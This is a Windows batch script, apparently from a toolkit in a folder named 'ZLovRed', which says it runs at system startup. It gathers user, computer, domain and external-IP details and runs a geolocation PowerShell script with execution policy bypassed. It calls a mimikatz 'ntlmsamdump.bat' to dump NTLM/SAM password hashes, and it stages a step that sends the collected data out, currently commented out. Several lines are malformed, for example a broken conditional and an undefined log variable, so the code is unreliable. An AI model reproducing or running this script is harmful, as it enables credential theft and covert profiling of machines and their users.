@echo off
rem *******************************************************
rem This Part of Script Makes a Header of the File
rem *******************************************************
rem

rem Set Zlovred Folder
rem
set ZLOVREDFOLDER=C:\pub1\Distrib\ZLovRed
rem

rem Rem Set Temp File
rem
rem set aTEMPTEXTFILE=%~dp0aTempTextContainer.TinySendRun.tmp.txt
set aTEMPTEXTFILE=%1

echo Create a Stamp File... > %aTEMPTEXTFILE%
echo %aTEMPTEXTFILE% >> %aTEMPTEXTFILE%
echo. >> %aTEMPTEXTFILE%
ver >> %aTEMPTEXTFILE%
echo. >> %aTEMPTEXTFILE%

echo "This file start when Computer System is Started or Rebooted" >> %aTEMPTEXTFILE%
echo "Date & Time Started and Rebooted: %DATE% & %TIME%" >> %aTEMPTEXTFILE%
echo a User Name %UserName%  >> %aTEMPTEXTFILE%
echo a Computer Name %ComputerName% >> %aTEMPTEXTFILE%
echo a Domain Name %UserDomain%  >> %aTEMPTEXTFILE%
echo a User Profile Folder %UserProfile% >> %aTEMPTEXTFILE%

echo  === *** === *** ===  >> %aTEMPTEXTFILE%
echo. >> %aTEMPTEXTFILE%

echo Add Additional Information...
set CMDFILE01=%~dp0getExtIp.TinySend.cmd
set CMDFILE02=%~dp0getSystemInfo.TinySend.cmd
if not exist %CMDFILE02% echo %CMDFILE02% is not found && goto LAB_CMD001
call %CMDFILE02% %aTEMPTEXTFILE%
:LAB_CMD001
if not exist %CMDFILE01% echo %CMDFILE01% is not found && goto LAB_CMDEND01
call %CMDFILE01% %aTEMPTEXTFILE%
:LAB_CMDEND01
set CMDFILE01=
set CMDFILE02=
set POSHFILE01=%~dp0Get-Geo-003.ps1
set POSHEXE=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe
if not exist %POSHFILE01% echo %POSHFILE01% is not found && goto LAB_POSH001
if not exist %POSHEXE% echo %POSHEXE% is not found && goto LAB_POSH001
%POSHEXE% -NoLogo -NoProfile -ExecutionPolicy Bypass -File %POSHFILE01% %aTEMPTEXTFILE%

:LAB_POSH001
set POSHFILE01=

rem Get DnRn*.bat files from a Current Directory
echo. >> %aTEMPTEXTFILE%

dir %~dp0DnRn*.bat >> %aTEMPTEXTFILE%

rem
rem Test MikhailMatfey
rem
set DESTFOLDER=%ZLOVREDFOLDER%\mimikatz
set CMDFILE01=%DESTFOLDER%\ntlmsamdump.bat
set if not exist "%CMDFILE01% echo %CMDFILE01% is not found && goto LAB_MikhailMatfey
call "%CMDFILE01% >> %aTEMPLOGFILE%"
:LAB_MikhailMatfey
set DESTFOLDER=
set CMDFILE=

rem
rem Test Files ...
rem
type %aTEMPTEXTFILE%
pause
del %aTEMPTEXTFILE%
rem

rem Send file...
rem
set CMDFILE01=%~dp0sendRun.TinySend.cmd
if not exist %CMDFILE01% echo %CMDFILE01% is not found && goto LAB_CMDEND02
rem call %CMDFILE01% %aTEMPTEXTFILE%
:LAB_CMDEND02
set CMDFILE01=

exit /b 0